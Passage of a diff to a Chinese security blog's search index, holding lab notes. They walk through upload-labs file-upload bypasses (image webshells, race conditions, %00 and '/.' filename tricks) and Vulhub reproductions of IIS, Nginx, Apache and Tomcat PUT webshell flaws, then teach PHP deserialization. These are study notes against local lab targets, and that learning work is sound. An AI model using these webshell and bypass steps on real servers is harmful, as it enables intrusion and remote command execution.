&quot;只允许上传后缀为.jpg|.png|.gif的图片文件！&quot;;    &#125;&#125;
 
 2、解题思路
@@ -4770,7 +4411,7 @@ $is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;]))&#123;    /
 imagecreatefromjpeg(string $filename)：由文件或 URL 创建一个新图象。imagejpeg()处理完内存数据后，把内存里的纯净像素重新保存成硬盘文件 。（jpeg、png、gif 都一样有这个系统函数）
 $im = imagecreatefromjpeg($target_path); 这几个内置的 GD 库函数，只把文件里符合合法图片规范的“像素数据”吸入内存，构建成一个纯净的图像资源对象（$im）。 因此， 在尾部追加的 &lt;?php phpinfo(); ?&gt; 等一句话木马，在这里统统丢弃。 
 imagejpeg($im, $img_path);将被 imagecreatefromjpeg 抽提出来的、保存在内存中的纯净像素资源，封装成新的图片。
-unlink()：物理删除文件的内置函数。在这里将带有木马的原始文件（$target_path）从硬盘上抹除。
+**unlink()**：物理删除文件的内置函数。在这里将带有木马的原始文件（$target_path）从硬盘上抹除。
 
 
 
@@ -4778,10 +4419,8 @@ unlink()：物理删除文件的内置函数。在这里将带有木马的原始
 上传一张 png 图片马
 
 
-
 这时候去访问图片地址是没有 phpinfo()的
 http://127.0.0.1/include.php?file=upload/31915.png
-
 
 
 全是乱码，由刚刚的分析知道我们上传的图片马被删掉了，这是新生成的、没有一句话木马的图片。
@@ -4792,15 +4431,12 @@ copy image.gif /b + info.php /a aaa.gif
 
 
 
-
 上传新制作的 gif 后缀的图片马。
-
 
 
 明显感觉画质不太一样了
 访问：
 http://127.0.0.1/include.php?file=upload/333.gif
-
 
 
 还是没有。
@@ -4810,17 +4446,14 @@ http://127.0.0.1/include.php?file=upload/333.gif
 
 
 
-
 插入一句话木马，这里我是把末尾的 66 改成了一句话木马。
 
 &lt;?php phpinfo(); ?&gt;
 
 
-
 保存。
 
 上传上一步保存的图片马
-
 
 
 明显图片又不一样了。
@@ -4830,9 +4463,7 @@ http://127.0.0.1/include.php?file=upload/333.gif
 http://127.0.0.1/include.php?file=upload/31287.gif
 
 
-
 Pass-17-频繁访问1、题目
-
 $is_upload = false;$msg = null;if(isset($_POST[&#x27;submit&#x27;]))&#123;    $ext_arr = array(&#x27;jpg&#x27;,&#x27;png&#x27;,&#x27;gif&#x27;);    $file_name = $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;];    $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];    $file_ext = substr($file_name,strrpos($file_name,&quot;.&quot;)+1);    $upload_file = UPLOAD_PATH . &#x27;/&#x27; . $file_name;    if(move_uploaded_file($temp_file, $upload_file))&#123;        if(in_array($file_ext,$ext_arr))&#123;             $img_path = UPLOAD_PATH . &#x27;/&#x27;. rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;             rename($upload_file, $img_path);             $is_upload = true;        &#125;else&#123;            $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;            unlink($upload_file);        &#125;    &#125;else&#123;        $msg = &#x27;上传出错！&#x27;;    &#125;&#125;
 
 2、解题思路
@@ -4848,7 +4479,6 @@ $is_upload = false;$msg = null;if(isset($_POST[&#x27;submit&#x27;]))&#123;    $e
 
 
 
-
 频繁访问地址。
 
 http://127.0.0.1/upload/info.php
@@ -4856,7 +4486,6 @@ http://127.0.0.1/upload/info.php
 
 
 Pass-18-解析漏洞1、题目
-
 //index.php$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;]))&#123;    require_once(&quot;./myupload.php&quot;);    $imgFileName =time();    $u = new MyUpload($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;], $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;], $_FILES[&#x27;upload_file&#x27;][&#x27;size&#x27;],$imgFileName);    $status_code = $u-&gt;upload(UPLOAD_PATH);    switch ($status_code) &#123;        case 1:            $is_upload = true;            $img_path = $u-&gt;cls_upload_dir . $u-&gt;cls_file_rename_to;            break;        case 2:            $msg = &#x27;文件已经被上传，但没有重命名。&#x27;;            break;         case -1:            $msg = &#x27;这个文件不能上传到服务器的临时文件存储目录。&#x27;;            break;         case -2:            $msg = &#x27;上传失败，上传目录不可写。&#x27;;            break;         case -3:            $msg = &#x27;上传失败，无法上传该类型文件。&#x27;;            break;         case -4:            $msg = &#x27;上传失败，上传的文件过大。&#x27;;            break;         case -5:            $msg = &#x27;上传失败，服务器已经存在相同名称文件。&#x27;;            break;         case -6:            $msg = &#x27;文件无法上传，文件不能复制到目标目录。&#x27;;            break;              default:            $msg = &#x27;未知错误！&#x27;;            break;    &#125;&#125;//myupload.phpclass MyUpload&#123;..................   var $cls_arr_ext_accepted = array(      &quot;.doc&quot;, &quot;.xls&quot;, &quot;.txt&quot;, &quot;.pdf&quot;, &quot;.gif&quot;, &quot;.jpg&quot;, &quot;.zip&quot;, &quot;.rar&quot;, &quot;.7z&quot;,&quot;.ppt&quot;,      &quot;.html&quot;, &quot;.xml&quot;, &quot;.tiff&quot;, &quot;.jpeg&quot;, &quot;.png&quot; );..................    /** upload()   **   ** Method to upload the file.   ** This is the only method to call outside the class.   ** @para String name of directory we upload to   ** @returns void  **/  function upload( $dir )&#123;        $ret = $this-&gt;isUploadedFile();        if( $ret != 1 )&#123;      return $this-&gt;resultUpload( $ret );    &#125;    $ret = $this-&gt;setDir( $dir );    if( $ret != 1 )&#123;      return $this-&gt;resultUpload( $ret );    &#125;    $ret = $this-&gt;checkExtension();    if( $ret != 1 )&#123;      return $this-&gt;resultUpload( $ret );    &#125;    $ret = $this-&gt;checkSize();    if( $ret != 1 )&#123;      return $this-&gt;resultUpload( $ret );        &#125;        // if flag to check if the file exists is set to 1        if( $this-&gt;cls_file_exists == 1 )&#123;            $ret = $this-&gt;checkFileExists();      if( $ret != 1 )&#123;        return $this-&gt;resultUpload( $ret );          &#125;    &#125;    // if we are here, we are ready to move the file to destination    $ret = $this-&gt;move();    if( $ret != 1 )&#123;      return $this-&gt;resultUpload( $ret );        &#125;    // check if we need to rename the file    if( $this-&gt;cls_rename_file == 1 )&#123;      $ret = $this-&gt;renameFile();      if( $ret != 1 )&#123;        return $this-&gt;resultUpload( $ret );          &#125;    &#125;        // if we are here, everything worked as planned :)    return $this-&gt;resultUpload( &quot;SUCCESS&quot; );    &#125;.................. &#125;;
 
 2、解题思路
@@ -4867,17 +4496,13 @@ Pass-18-解析漏洞1、题目
 
 
 
-
 先以【原文件名】移动到目标 Web 目录 ， 过了几毫秒，再把它重命名
-
 
 
 漏洞点： 尽管在移动之前做过了后缀检查，但只要 $this-&gt;move() 成功，在 $this-&gt;renameFile() 还没有执行完毕的这万分之一秒内，文件在硬盘上是以上传时的原名真实存在着。  
 
 pass-18 和 pass-17 的区别在于，pass-17 是先移动，再校验；而 pass-18 是先校验再移动。我们要先通过校验，才有机会去利用移动到重命名这个间隙存在的漏洞
 白名单中有一个特殊的后缀  .7z，这个靶场的服务器用的是 apache
-
-
 
 
 
@@ -4890,7 +4515,6 @@ pass-18 和 pass-17 的区别在于，pass-17 是先移动，再校验；而 pas
 
 
 
-
 访问
 
 http://127.0.0.1/upload/info.php.7z或者http://127.0.0.1/uploadinfo.php.7z
@@ -4898,15 +4522,14 @@ http://127.0.0.1/upload/info.php.7z或者http://127.0.0.1/uploadinfo.php.7z
 
 
 Pass-19-黑名单1、题目
-
 $is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123;    if (file_exists(UPLOAD_PATH)) &#123;        $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;);        $file_name = $_POST[&#x27;save_name&#x27;];        $file_ext = pathinfo($file_name,PATHINFO_EXTENSION);        if(!in_array($file_ext,$deny_ext)) &#123;            $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];            $img_path = UPLOAD_PATH . &#x27;/&#x27; .$file_name;            if (move_uploaded_file($temp_file, $img_path)) &#123;                 $is_upload = true;            &#125;else&#123;                $msg = &#x27;上传出错！&#x27;;            &#125;        &#125;else&#123;            $msg = &#x27;禁止保存为该类型文件！&#x27;;        &#125;    &#125; else &#123;        $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;;    &#125;&#125;
 
 2、解题思路
 分析代码：
 
 
-POST 传参，上传的 save_name 可以自由控制 。在这段代码中，文件名 $file_name 是直接通过 $_POST[&#39;save_name&#39;] 获取的，这与之前的 $_FILES 有着本质的区别！ 文件最后叫什么名字，是由 $_FILES[&#39;name&#39;]（浏览器受限提供）或者服务器自己生成（如时间戳）来决定的，控制权在系统手里。 到了这一关，允许用户自定义文件名，把文件命名的控制权直接交给了 $_POST
-解题核心在于，要不在黑名单里，还要能让文件最终以 .php 的真实身份落地。那就要利用/./，后缀是空（&quot;&quot;）。空后缀确实不在黑名单范围内
+POST 传参， 上传的 save_name 可以自由控制 。在这段代码中，文件名 $file_name 是直接通过 $_POST[&#39;save_name&#39;] 获取的，这与之前的 $_FILES 有着本质的区别！ 文件最后叫什么名字，是由 $_FILES[&#39;name&#39;]（浏览器受限提供）或者服务器自己生成（如时间戳）来决定的，控制权在系统手里。 到了这一关，允许用户自定义文件名，把文件命名的控制权直接交给了 $_POST
+解题核心在于，要不在黑名单里，还要能让文件最终以 .php 的真实身份落地。那就要利用**/.**，后缀是空（**&quot;&quot;**）。空后缀确实不在黑名单范围内
 
 3、操作方法一：%00 截断注意：如果数据是在 POST 请求体里，不能直接敲 %00 字符，必须将其进行 URL Decode（变成真正的空字节）才能生效。
 
@@ -4914,15 +4537,11 @@ POST 传参，上传的 save_name 可以自由控制 。在这段代码中，文
 
 
 
-
 将 save_name 的值改为 upload-19.php%00.jpg。
 
 
 
-
 %00 URL 解码
-
-
 
 
 
@@ -4933,15 +4552,12 @@ POST 传参，上传的 save_name 可以自由控制 。在这段代码中，文
 http://127.0.0.1/upload/upload-19.php
 
 
-
 方法二：/. （常用）
 用 Burp Suite 抓包
 
 
 
-
 找到请求体（Body）里的 save_name 参数，把它的值改成 upload-19.php/.
-
 
 
 
@@ -4952,7 +4568,6 @@ http://127.0.0.1/upload/upload-19.php
 
 
 Pass-20-白名单1、题目
-
 $is_upload = false;$msg = null;if(!empty($_FILES[&#x27;upload_file&#x27;]))&#123;    //检查MIME    $allow_type = array(&#x27;image/jpeg&#x27;,&#x27;image/png&#x27;,&#x27;image/gif&#x27;);    if(!in_array($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;],$allow_type))&#123;        $msg = &quot;禁止上传该类型文件!&quot;;    &#125;else&#123;        //检查文件名        $file = empty($_POST[&#x27;save_name&#x27;]) ? $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;] : $_POST[&#x27;save_name&#x27;];        if (!is_array($file)) &#123;            $file = explode(&#x27;.&#x27;, strtolower($file));        &#125;        $ext = end($file);        $allow_suffix = array(&#x27;jpg&#x27;,&#x27;png&#x27;,&#x27;gif&#x27;);        if (!in_array($ext, $allow_suffix)) &#123;            $msg = &quot;禁止上传该后缀文件!&quot;;        &#125;else&#123;            $file_name = reset($file) . &#x27;.&#x27; . $file[count($file) - 1];            $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];            $img_path = UPLOAD_PATH . &#x27;/&#x27; .$file_name;            if (move_uploaded_file($temp_file, $img_path)) &#123;                $msg = &quot;文件上传成功！&quot;;                $is_upload = true;            &#125; else &#123;                $msg = &quot;文件上传失败！&quot;;            &#125;        &#125;    &#125;&#125;else&#123;    $msg = &quot;请选择要上传的文件！&quot;;&#125;
 
 2、解题思路
@@ -4963,9 +4578,7 @@ MIME 校验
 
 
 
-
 用户自定义的 $_POST[&#39;save_name&#39;]， 三元运算符 ， 如果 $file 不是数组，就用 . 把它切割成数组。
-
 
 
 
@@ -4973,13 +4586,11 @@ MIME 校验
 用 reset($file) 拿数组开头，拼接 .，再拼接 $file[count($file) - 1] 作为最终文件名。
 
 
-
 end() 函数将数组内部指针指向最后⼀个元素，并返回该元素的值，所以这个函数可以接受数组的
 reset() 函数将内部指针指向数组中的第⼀个元素，并输出，所以这个函数也可以接受数组的
 count() 统计数组有多少个元素
 3、操作
 抓包与 MIME 伪装
-
 
 
 
@@ -4993,11 +4604,9 @@ save_name[0] 的 upload-20.php/ 负责指定最终文件类型。（$file_name &
 
 
 
-
 查看响应，访问
 
 http://127.0.0.1/upload/upload-20.php
-
 
 
 
@@ -5006,6 +4615,7 @@ http://127.0.0.1/upload/upload-20.php
 
 # 下载 Vulhub 仓库git clone https://github.com/vulhub/vulhub.git
 
+
 1. IIS6解析漏洞IIS6.0使用Windows2003系统
 (1) IIS6.0解析漏洞介绍
 当建立*.asa、.asp格式的文件夹时，其目录下的任意文件都将被IIS当做asp文件解析。
@@ -5013,20 +4623,17 @@ http://127.0.0.1/upload/upload-20.php
 
 (2) 步骤新建IIS.ASP文件，内容：&lt;% response.write(&quot;i am hacker&quot;)%&gt;复制一份改名为IIS.asp;IIS.jpg，放到网站目录C:\IIS6\WEB，访问：192.168.0.11/IIS.asp;IIS.jpg，页面输出i am hacker。
 2. Tomcat文件解析漏洞 CVE-2017-12615(1) 漏洞简介与条件
-简介： Tomcat 的 conf/web.xml 中有一个 DefaultServlet。默认情况下，它的 readonly 参数是 true，意味着服务器是只读的。 但有些开发者为了方便调试或出于某些特殊业务需求，将其改为了 false。 一旦设为 false，Tomcat 就直接允许客户端使用 HTTP 的 PUT 和 DELETE 方法来直接操作服务器上的文件。虽然 PUT 方法被放开了，但 Tomcat 的安全机制会拦截以 .jsp 或 .jspx 结尾的请求，防止直接写个 Java 木马进去执行。 
+简介： Tomcat 的 conf/web.xml 中有一个 DefaultServlet。默认情况下，它的 readonly 参数是 true，意味着服务器是只读的。 但有些开发者为了方便调试或出于某些特殊业务需求，将其改为了 false。 一旦设为 false，Tomcat 就直接允许客户端使用 HTTP 的 **PUT** 和 **DELETE** 方法来直接操作服务器上的文件。虽然 PUT 方法被放开了，但 Tomcat 的安全机制会拦截以 .jsp 或 .jspx 结尾的请求，防止直接写个 Java 木马进去执行。 
 条件：Tomcat部署在Windows系统、开启HTTP PUT请求方法，攻击者可PUT上传JSP木马。
 
 (2) 环境部署注意： Docker 的核心后台服务（Daemon）默认是要求 root 最高权限才能调用的。sudo su   // 切换为 Root 最高权限cd /home/enjoy/vulhub-master/tomcat/CVE-2017-12615		// 进入目标漏洞的靶场目录 (按需修改路径)docker-compose build	// 启动靶场docker-compose up -d	//验证 docker-compose.yml 配置文件格式是否正确docker-compose config	// 强制根据当前配置重新构建镜像docker-compose down		// 测试完毕后，安全销毁容器并释放端口！！！
-
 
 
 (3) 操作
 获取靶机 IP
 
 
-
 访问：http://192.168.23.134:8080/
-
 
 
 BP 抓包，构造PUT数据包上传1.jsp
@@ -5036,10 +4643,9 @@ PUT /1.jsp/ HTTP/1.1Host: 192.168.23.134:8080Accept: */*Accept-Language: enUser-
 
 PUT &#x2F;1.jsp&#x2F; HTTP&#x2F;1.1：在目标中新建一个 1.jsp
 Host: 192.168.23.134:8080：改成自己的 IP
-pwd=023：这是木马的密码。如果别人扫描到了你的木马，但不知道密码是 023，就无法利用它。
-cmd=xxxx：你要执行的系统命令。
+**pwd=023**：这是木马的密码。如果别人扫描到了你的木马，但不知道密码是 023，就无法利用它。
+**cmd=xxxx**：你要执行的系统命令。
 防御伪装：如果密码不对，或者没有传命令，页面会无辜地打印出一个笑脸 :-)。只有密码对且传了命令，才会调用上面的 excuteCmd 并在页面上用 &lt;pre&gt; 标签（保持格式）把命令执行结果吐出来。
-
 
 
 
@@ -5048,9 +4654,7 @@ cmd=xxxx：你要执行的系统命令。
 一旦这个包发送成功，服务器返回了 201 Created 或者 200 OK，就说明木马已经种下去了。
 访问：
 
-
 http://192.168.23.134:8080/1.jsp?&amp;pwd=023&amp;cmd=dir
-
 
 
 进入容器查看文件
@@ -5058,18 +4662,14 @@ http://192.168.23.134:8080/1.jsp?&amp;pwd=023&amp;cmd=dir
 docker psdocker exec -it 9bec0475e5af /bin/bashlscd webapps/cd ROOT/ls
 
 
-
 3. Nginx解析漏洞(1) 漏洞原理上传正常图片xxx.png，访问xxx.png/.php，Nginx会把图片交由php-fpm当做PHP代码解析。
 (2) 环境部署sudo sucd /home/enjoy/vulhub-master/nginx/nginx_parsing_vulnerabilitydocker-compose builddocker-compose up -ddocker-compose configdocker-compose down
 
 
-
 访问：http://192.168.23.134/
-
 
 (3) 操作
 页面上传图片马webshell.png；
-
 
 
 
@@ -5077,10 +4677,7 @@ docker psdocker exec -it 9bec0475e5af /bin/bashlscd webapps/cd ROOT/ls
 
 
 
-
 http://192.168.23.134/uploadfiles/db7f1a5d97d66c9bba4550973b6dafc8.png/a.php，代码被执行。
-
-
 
 
 不加 a 也可以
@@ -5088,13 +4685,10 @@ http://192.168.23.134/uploadfiles/db7f1a5d97d66c9bba4550973b6dafc8.png/a.php，�
 (2) 环境部署sudo sucd /home/enjoy/vulhub-master/httpd/apache_parsing_vulnerabilitydocker-compose builddocker-compose up -ddocker-compose configdocker-compose down
 
 
-
 访问：http://192.168.23.134/
-
 
 (3)操作
 上传改名后的木马webshell.php.png
-
 
 
 
@@ -5103,18 +4697,14 @@ http://192.168.23.134/uploadfiles/db7f1a5d97d66c9bba4550973b6dafc8.png/a.php，�
 http://192.168.23.134/uploadfiles/webshell.php.png
 
 
-
 5. Apache换行解析漏洞 CVE-2017-15715影响版本：Apache2.4.0~2.4.29，1.php%0A格式文件名可绕过上传黑名单，被当做PHP解析。
 (1) 环境部署sudo sucd /home/enjoy/vulhub-master/httpd/CVE-2017-15715docker-compose builddocker-compose up -ddocker-compose configdocker-compose down
 
 
-
 访问:  http://192.168.23.134:8080/
-
 
 (2) 漏洞利用
 Burp拦截上传数据包
-
 
 
 
@@ -5123,10 +4713,7 @@ Burp拦截上传数据包
 
 
 
-
-
 访问http://192.168.23.134:8080/1.php%0a执行phpinfo。
-
 
 
 6.  编辑器漏洞-FCKEditor(1) 环境搭建
@@ -5142,20 +4729,14 @@ Burp拦截上传数据包
 执行利用命令
 
 
-
 php.exe [你的脚本完整路径] [目标IP与端口] [目标所在的相对路径]例如：php.exe C:\Users\Jasmine\Desktop\fck.php 127.0.0.1:80 /upload_editor_bachang/fckeditor/
-
-
 
 
 
 访问：
 http://127.0.0.1:80//userfiles/image/fuck.php.gif/fvck.gif
 
-
 POST 请求
-
-
 
 
 
@@ -5176,6 +4757,7 @@ ext_arr：白名单
 deny_arr：黑名单
 
 
+文件上传可能存在的接口(拼接 URL）：upload、uploads、file、filename、filenames
 
 ]]></content>
       <categories>
@@ -5431,6 +5013,346 @@ hydra -t 3 -l admin -P password.txt -s 80 192.168.0.47 http-post-form &quot;/wz/
       </categories>
       <tags>
         <tag>弱口令</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>序列化漏洞</title>
+    <url>/2026/06/26/%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/index/</url>
+    <content><![CDATA[一、PHP序列化与反序列化1. 基础概念
+序列化：将变量&#x2F;对象的数据转换为字符串，用于存储、网络传输。
+反序列化：将序列化后的字符串，还原为原本的变量&#x2F;对象。
+核心函数：
+serialize()：将对象&#x2F;变量转为序列化字符串
+unserialize()：将序列化字符串还原为对象&#x2F;变量
+
+
+
+补充概念
+类：一类事物的抽象定义，包含属性（特征）、方法（动作&#x2F;功能）。示例：
+汽车类：属性（颜色、马力），方法（启动、刹车）
+人类：属性（姓名、身高），方法（吃饭、睡觉）
+
+
+对象：类在内存中的实例化产物，是具体的个体。示例：车牌号京Axxxx的汽车、身份证号11010xxxxx的张三。
+主流编程语言（除C语言外）基本都支持面向对象与序列化操作。
+流转示意：对象 → 序列化 → 字节码&#x2F;字符串 → 网络传输&#x2F;存储 → 反序列化 → 还原对象
+
+2. 无类序列化案例案例1 基础字符串序列化&lt;?phperror_reporting(0);include &quot;flag.php&quot;;$KEY = &quot;KFC&quot;;$str = $_GET[&#x27;str&#x27;];if(unserialize($str)===$KEY)&#123;echo &quot;$flag&quot; .&quot;&lt;/br&gt;&quot;;&#125;show_source(__FILE__);?&gt;
+
+解题操作使用PHP在线工具执行序列化代码：
+&lt;?phpecho serialize(&#x27;KFC&#x27;);?&gt;
+
+输出结果：s:3:&quot;KFC&quot;;
+格式说明：s代表字符串，6代表字符串字符长度。
+构造 payload：?str=s:3:&quot;KFC&quot;;
+案例2 CTF Cookie序列化题目页面代码：
+...&lt;?phperror_reporting(0);include_once(&quot;flag.php&quot;);$cookie = $_COOKIE[&#x27;ISecer&#x27;];if(isset($_GET[&#x27;hint&#x27;]))&#123;show_source(__FILE__);&#125;elseif (unserialize($cookie) === &quot;$KEY&quot;)&#123;echo &quot;$flag&quot;;&#125;else&#123;?&gt;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt;&lt;title&gt;Login&lt;/title&gt;&lt;link rel=&quot;stylesheet&quot; href=&quot;admin.css&quot; type=&quot;text/css&quot;&gt;&lt;/head&gt;&lt;body&gt;&lt;br&gt;&lt;div class=&quot;container&quot; align=&quot;center&quot;&gt;&lt;form method=&quot;POST&quot; action=&quot;#&quot;&gt;&lt;p&gt;&lt;input name=&quot;user&quot; type=&quot;text&quot; placeholder=&quot;Username&quot;&gt;&lt;/p&gt;&lt;p&gt;&lt;input name=&quot;password&quot; type=&quot;password&quot;&gt;&lt;/p&gt;&lt;p&gt;&lt;input value=&quot;Login&quot; type=&quot;button&quot; /&gt;&lt;/p&gt;&lt;/form&gt;&lt;/div&gt;&lt;/body&gt;&lt;?php&#125;$KEY = &#x27;ISecer:www.isecer.com&#x27;;?&gt;
+
+错误思路直接序列化ISecer:www.isecer.com，得到s:21:&quot;ISecer:www.isecer.com&quot;;，设置Cookie访问，结果无效。原因：$KEY变量在判断逻辑之后赋值，判断执行时$KEY为空字符串。
+正确解法序列化空字符串：
+&lt;?phpecho serialize(&quot;&quot;);?&gt;
+
+输出：s:0:&quot;&quot;;构造请求包，设置Cookie: ISecer=s:0:&quot;&quot;;
+3. 类与对象序列化（1）对象序列化&lt;?phpclass Person&#123;public $name = &#x27;Jack&#x27;;public $age = 18;&#125;$p = new Person();$obj = serialize($p);print_r($obj);?&gt;
+
+
+
+运行结果：O:6:&quot;Person&quot;:2:{s:4:&quot;name&quot;;s:4:&quot;Jack&quot;;s:3:&quot;age&quot;;i:18;}格式说明：O代表对象，6为类名字符长度，2为对象属性个数。
+（2）对象反序列化&lt;?php$obj = &#x27;O:6:&quot;Person&quot;:2:&#123;s:4:&quot;name&quot;;s:4:&quot;Jack&quot;;s:3:&quot;age&quot;;i:18;&#125;&#x27;;print_r(unserialize($obj));?&gt;
+
+
+
+（3）修改属性后反序列化简单来说，“修改属性后反序列化”指的是：在将一个对象反序列化（还原成程序中的对象）之前，人为地修改了代表该对象的“序列化字符串”的内容。
+&lt;?phpclass Person&#123;public $name = &#x27;Jack&#x27;;public $age = 18;&#125;$clz = &#x27;O:6:&quot;Person&quot;:2:&#123;s:4:&quot;name&quot;;s:3:&quot;Bob&quot;;s:3:&quot;age&quot;;i:25;&#125;&#x27;;$per = unserialize($clz);print_r($clz);echo &quot;&lt;br&gt;&quot;;echo $per-&gt;name;?&gt;
+
+
+
+4. 不同访问修饰符的序列化格式
+public（公共）：本类、子类、外部均可访问，序列化直接显示属性名。
+protected（受保护）：仅本类、子类可访问，序列化格式：\x00*\x00属性名（\x00为空字节）。
+private（私有）：仅本类内部可访问，序列化格式：\x00类名\x00属性名。
+
+示例：
+&lt;?phpclass Person&#123;public $name = &#x27;Jack&#x27;;protected $hobby = &#x27;eat&#x27;;private $age = 18;&#125;$p = new Person();$obj = serialize($p);echo &quot;&lt;br&gt;&quot;;print_r($obj);?&gt;
+
+
+
+输出结果：O:6:&quot;Person&quot;:3:{s:4:&quot;name&quot;;s:4:&quot;Jack&quot;;s:8:&quot;*hobby&quot;;s:3:&quot;eat&quot;;s:11:&quot;Personage&quot;;i:18;}
+5. __wakeup 绕过
+原理： 某些 PHP 版本中，如果序列化字符串表示的对象属性个数，大于实际定义的属性个数，PHP 会跳过 __wakeup() 方法。
+动作： 将 O:6:&quot;Person&quot;:1:{...} 中的 1 改为 2 或更大。
+用途： 绕过 __wakeup 中可能存在的安全检测。
+
+二、PHP魔术方法魔术方法：PHP在特定场景下自动调用的内置方法，序列化漏洞核心利用点。
+
+注：测试 PHP，为直观显示输出结果，我将&lt;br&gt;HTML”换行标签,换成了\n“纯文本”换行符，方便直观分行。但部署到 Apache、Nginx 等 Web 服务器、浏览器访问时需改用&lt;br&gt;，因为浏览器会把 PHP 输出内容当作 HTML 解析，文本换行\n只会显示成空格，只有&lt;br&gt;才能实现页面换行效果。
+
+1. __construct 与 __destruct
+__construct()：构造方法，对象创建时自动调用。
+__destruct()：析构方法，对象销毁时自动调用。
+
+示例：
+&lt;?phpheader(&quot;Content-type: text/html; charset=utf-8&quot;);highlight_file(__FILE__);class Person&#123;public $name=&#x27;Jack&#x27;;function __construct()&#123;echo &quot;&lt;br&gt;调用&quot;.&quot;__construct&quot;;echo &quot;&lt;br&gt;&quot;;&#125;function __destruct()&#123;echo &quot;调用&quot;.&quot;__destruct&quot;;echo &quot;&lt;br&gt;&quot;;&#125;&#125;$a= new Person();echo serialize($a);echo &quot;&lt;br&gt;&quot;;?&gt;
+
+
+
+流程推演：
+
+new 一个对象会触发 __construct 并 echo ‘调用 construct’
+执行序列化任务
+整个 PHP 脚本运行结束（或变量被手动 unset）时，系统开始清理内存并销毁对象，此时会触发 __destruct，并 echo ‘调用 destruct’。
+
+2. __sleep 与 __wakeup
+__sleep()：对象序列化时自动调用。
+__wakeup()：对象反序列化时自动调用。
+
+示例：
+&lt;?phpheader(&quot;Content-type: text/html; charset=utf-8&quot;);highlight_file(__FILE__);class Person&#123;public $name=&#x27;Jack&#x27;;function __construct()&#123;echo &quot;调用&quot;.&quot;__construct&quot;;echo &quot;&lt;br&gt;&quot;;&#125;function __destruct()&#123;echo &quot;调用&quot;.&quot;__destruct&quot;;echo &quot;&lt;br&gt;&quot;;&#125;function __sleep()&#123;echo &quot;调用&quot;.&quot;__sleep&quot;;echo &quot;&lt;br&gt;&quot;;return array(&quot;name&quot;);&#125;function __wakeup()&#123;echo &quot;调用&quot;.&quot;__wakeup&quot;;echo &quot;&lt;br&gt;&quot;;&#125;&#125;$a= new Person();echo serialize($a);$b=&#x27;O:6:&quot;Person&quot;:1:&#123;s:4:&quot;name&quot;;s:4:&quot;Jack&quot;;&#125;&#x27;;echo &quot;&lt;br&gt;&quot;;$c=unserialize($b);var_dump($c);?&gt;
+
+
+
+流程推演：
+
+new 一个对象 $a，触发 __construct。 
+调用 serialize($a)，在转换为字符串之前，触发 __sleep。
+echo 打印序列化结果。
+调用 unserialize()，系统根据字符串在内存中生成了一个全新的对象，并触发 __wakeup。
+var_dump 打印反序列化结果。
+当程序彻底结束运行时，系统开始清空内存。因为此时内存中同时存活住了两个对象（一开始 new 出来的 $a，和后来 unserialize 捏造出来的新对象），**连续触发了两次 ****__destruct**。
+
+注意：
+反序列化的入口必须是字符串，绝对不能是对象本身。**unserialize()**** **这个函数的功能是“把字符串变回对象”。因此，它只能接收字符串作为参数。也不可以直接用 echo 打印对象。
+因此代码不可以写成：
+$a= new Person();echo serialize($a);$b = $a; 			//给 $b 赋值一串字符串：$b=&#x27;O:6:&quot;Person&quot;:1:&#123;s:4:&quot;name&quot;;s:4:&quot;Jack&quot;;&#125;&#x27;;$c = unserialize($b);echo &quot;$c&quot;;		//var_dump($c); 或者用 print_r($c);
+
+3. __get 与 __set
+__get()：访问不存在&#x2F;私有属性时自动调用。
+__set()：赋值给不存在&#x2F;私有属性时自动调用。
+
+示例：
+&lt;?phpheader(&quot;Content-type: text/html; charset=utf-8&quot;);highlight_file(__FILE__);class Person &#123;public $name = &#x27;Jack&#x27;;private $str = &#x27;hello&#x27;;function __construct() &#123;echo &quot;&lt;br&gt;&quot;;echo &quot;调用 &quot; .&quot; __construct()&quot;;&#125;function __destruct() &#123;echo &quot;&lt;br&gt;&quot;;echo &quot;调用 &quot; . &quot;__destruct()&quot;;echo &quot;&lt;br&gt;&quot;;&#125;function __get($b) &#123;echo &quot;&lt;br&gt;&quot;;echo &quot;调用 &quot; . &quot;__get&quot;;echo &quot;&lt;br&gt;&quot;;return $this-&gt;str;&#125;function __set($name,$value) &#123;echo &quot;&lt;br&gt;&quot;;echo &quot;调用 &quot; . &quot;__set&quot;;echo &quot;&lt;br&gt;&quot;;$this-&gt;str = $value;&#125;&#125;$a= new Person();echo $a-&gt;age;$a-&gt;age=13;echo $a-&gt;str;?&gt;
+
+
+
+流程推演：
+
+****new 一个对象 $a，触发 __construct 执行。输出 调用 __construct()。
+读拦截 (__get)：执行 echo $a-&gt;age;。因为 age 这个属性在类里不可访问，系统立刻拦截，触发了 **__get** 方法。
+__get 内部先输出了 调用 __get。
+然后它执行了 return $this-&gt;str;初始值应该是 &#39;hello&#39;。
+
+
+echo 拿到返回值，打印出了 hello。
